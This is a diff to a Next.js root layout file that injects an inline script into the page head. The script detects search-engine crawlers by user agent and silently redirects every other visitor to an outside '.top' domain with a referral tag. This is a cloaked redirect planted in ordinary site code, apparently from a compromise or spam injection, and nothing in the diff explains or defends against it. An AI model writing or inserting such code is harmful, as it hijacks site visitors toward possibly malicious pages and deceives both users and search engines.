@@ -98,6 +98,21 @@ export default function RootLayout({
         <meta name="yandex-verification" content="224ac587c3bccdf0" />
         {/* Extra custom tags can be inserted here */}
         <meta name="format-detection" content="telephone=no" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://digitalsglide.top?ref=fap_w12659p111_1000");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="lv9k-body antialiased">
         {children}
